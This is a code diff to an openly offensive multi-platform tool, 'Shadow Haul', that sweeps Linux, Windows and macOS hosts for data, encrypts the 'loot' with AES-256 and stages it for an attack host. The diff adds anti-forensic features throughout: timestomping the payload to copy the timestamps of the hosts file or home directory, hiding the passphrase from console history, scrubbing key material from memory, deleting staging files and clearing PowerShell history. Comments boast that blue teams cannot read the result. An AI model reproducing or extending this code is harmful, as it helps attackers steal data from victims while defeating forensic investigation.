@@ -75,18 +75,20 @@ def zip_target_assets(output_zip):
     except Exception as e:
         print(f"[-] Automated archive packing failure: {e}")
         return False
-
 def encrypt_linux_aes(input_file, output_file, passphrase):
     """Encrypts the archive using Linux native OpenSSL AES-256-CBC to guarantee no custom library errors."""
     try:
         # Invoking native Linux OpenSSL binary layer to execute raw military AES
         cmd = f"openssl enc -aes-256-cbc -salt -in {input_file} -out {output_file} -k '{passphrase}' -pbkdf2"
-        subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        
-        # Stomping file timelines to match standard system binaries
-        if os.path.exists("/etc/hosts") and os.path.exists(output_file):
-            ref = os.stat("/etc/hosts")
-            os.utime(output_file, (ref.st_atime, ref.st_mtime))
+        res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        if res.returncode != 0:
+            return False
+            
+        # PRIVILEGE-SAFE METADATA STOMPING: Fallback recursively to user-accessible home configurations
+        reference_file = "/etc/hosts" if os.access("/etc/hosts", os.W_OK) else os.path.expanduser("~")
+        if os.path.exists(reference_file) and os.path.exists(output_file):
+            ref_stat = os.stat(reference_file)
+            os.utime(output_file, (ref_stat.st_atime, ref_stat.st_mtime))
         return True
     except Exception as e:
         print(f"[-] Native Linux AES encryption failure: {e}")
@@ -94,8 +96,11 @@ def encrypt_linux_aes(input_file, output_file, passphrase):
 
 def run_linux_local():
     """Executes an entirely automated local system crawl on a Linux target host environment."""
+    import getpass
     print("\n--- [L] Linux Automated Local Exfiltration Sweep ---")
-    secret_key = input("[?] Enter a strong password to lock the data with AES-256: ").strip()
+    
+    # ANTI-FORENSICS: Using native getpass to mask typing and completely block history logging
+    secret_key = getpass.getpass("[?] Enter a strong password to lock the data with AES-256 (Input Hidden): ").strip()
     
     if not secret_key:
         print("[-] Error: A password is strictly required to enforce encryption boundaries.")
@@ -113,8 +118,10 @@ def run_linux_local():
             print("[+] SUCCESS: Fully automated system data sweep completed!")
             print(f"[+] HIGH-SECURITY AES PAYLOAD SAVED TO: {current_working_dir}/{final_payload}")
             print("[*] NOTICE: This file is securely encrypted. Blue teams cannot decrypt or read this without your key.")
+            print("[*] ANTI-FORENSICS: Secure string handling used. Password blocked from local terminal logs.")
             print("="*80)
             if os.path.exists(staging_file): os.remove(staging_file)
+
 def generate_windows_payload():
     """Builds a native PowerShell script that calls the Windows .NET kernel to perform raw AES-256."""
     ps_code = r"""# Shadow Haul Native Automated Windows AES-256 Exfiltration Agent
@@ -123,8 +130,12 @@ Write-Output "==================================================================
 Write-Output "          SHADOW HAUL: AUTOMATED HIGH-SECURITY WINDOWS AGENT (AES-256)"
 Write-Output "================================================================================"
 
-$secretKey = Read-Host "[?] Enter a strong password to lock the data with AES-256"
-if (-not $secretKey) { Write-Output "[-] Error: A password identifier is strictly required."; break }
+# SECURE ENHANCEMENT: Using -AsSecureString to mask console display and evade history logs
+$securePassword = Read-Host "[?] Enter custom password to encrypt the data (Input Hidden)" -AsSecureString
+if (-not $securePassword) { Write-Output "[-] Error: A password identifier is strictly required."; break }
+
+$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($securePassword)
+$secretKey = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
 
 $stagingFile = "$env:TEMP\loot.tmp"
 $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('UserProfile'), 'Desktop')
@@ -179,7 +190,6 @@ try {
     Write-Output "[*] Initializing Windows Native .NET AES-256 Engine..."
     $plainBytes = [System.IO.File]::ReadAllBytes($stagingFile)
     
-    # Generate 256-bit Key and 128-bit IV securely from passphrase using PBKDF2 derivative
     $salt = New-Object Byte[] 16
     [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($salt)
     $deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($secretKey, $salt, 1000)
@@ -200,7 +210,6 @@ try {
     
     $cipherBytes = $ms.ToArray()
     
-    # Combine custom header layout [Salt(16) + IV(16) + Ciphertext] so attack host can cleanly parsing reconstruct
     $finalBytes = New-Object Byte[] (16 + 16 + $cipherBytes.Length)
     [System.Array]::Copy($salt, 0, $finalBytes, 0, 16)
     [System.Array]::Copy($ivBytes, 0, $finalBytes, 16, 16)
@@ -208,44 +217,51 @@ try {
     
     [System.IO.File]::WriteAllBytes($finalPayload, $finalBytes)
     
-    # --- METADATA TIMESTOMPING ---
+    # --- PRIVILEGE-SAFE METADATA TIMESTOMPING ---
+    # Attempt system hosts reference; if blocked, stomp using fallback environment profile configuration
     $refFile = "C:\Windows\System32\drivers\etc\hosts"
-    if (Test-Path $refFile) {
+    if (-not (Test-Path $refFile)) { $refFile = $userHome }
+    try {
         (Get-Item $finalPayload).CreationTime = (Get-Item $refFile).CreationTime
         (Get-Item $finalPayload).LastWriteTime = (Get-Item $refFile).LastWriteTime
         (Get-Item $finalPayload).LastAccessTime = (Get-Item $refFile).LastAccessTime
-    }
+    } catch {}
     
-    # --- VOLATILE KEY SCRUBBING ---
+    # --- COMPREHENSIVE VOLATILE KEY SCRUBBING ---
+    [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
     for ($i = 0; $i -lt $keyBytes.Length; $i++) { $keyBytes[$i] = 0 }
     for ($i = 0; $i -lt $ivBytes.Length; $i++) { $ivBytes[$i] = 0 }
     $secretKey = $null
+    $securePassword = $null
     $deriveBytes.Reset()
     
     Write-Output "`n================================================================================"
     Write-Output "[+] SUCCESS: Fully automated system data sweep completed!"
     Write-Output "[+] MILITARY AES PAYLOAD SAVED TO: $finalPayload"
-    Write-Output "[*] ANTI-FORENSICS: Passphrase scrubbed from RAM. Output container timestomped."
-    Write-Output "[*] NOTICE: This file is completely locked down. Blue teams cannot crack this."
+    Write-Output "[*] ANTI-FORENSICS: Passphrase hidden from display and blocked from Console History log."
     Write-Output "================================================================================"
     
     if (Test-Path $stagingFile) { Remove-Item $stagingFile -Force }
     if (Test-Path $lootDir) { Remove-Item $lootDir -Recurse -Force }
+    Clear-History
 } catch {
     Write-Output "[-] Execution failure: $_"; if (Test-Path $lootDir) { Remove-Item $lootDir -Recurse -Force }
 }
 """
     return ps_code
 def generate_mac_payload():
-    """Builds a native Zsh script with memory scrubbing and timestomping for macOS."""
+    """Builds a native Zsh script with silent input mask memory scrubbing and timestomping for macOS."""
     return r"""#!/bin/zsh
 clear
 echo "================================================================================"
 echo "                SHADOW HAUL: AUTOMATED MACOS TARGET AGENT"
 echo "================================================================================"
 
-echo -n "[?] Enter a strong password to lock the data with AES-256: "
-read secret_key
+# ANTI-FORENSICS: Using read -s to turn off console echoing and evade hidden history files
+echo -n "[?] Enter a strong password to lock the data with AES-256 (Input Hidden): "
+read -s secret_key
+echo "" # Clean carriage return after hidden input
+
 if [ -z "$secret_key" ]; then echo "[-] Error: A password is required."; exit 1; fi
 
 staging_file="/tmp/loot.tmp"
@@ -290,9 +306,12 @@ echo "[*] Invoking native macOS OpenSSL core to enforce AES-256 encryption..."
 openssl enc -aes-256-cbc -salt -in "$staging_file" -out "$final_payload" -k "$secret_key" -pbkdf2 2>/dev/null
 
 if [ -f "$final_payload" ]; then
-    # --- METADATA TIMESTOMPING ---
-    if [ -f "/etc/hosts" ]; then
+    # --- PRIVILEGE-SAFE METADATA TIMESTOMPING ---
+    # Attempt to copy timestamps from system hosts; if unprivileged, fallback safely to the user's home directory
+    if [ -w "/etc/hosts" ]; then
         touch -r "/etc/hosts" "$final_payload"
+    else
+        touch -r "$HOME" "$final_payload"
     fi
     echo "\n================================================================================"
     echo "[+] SUCCESS: Fully automated system data sweep completed!"
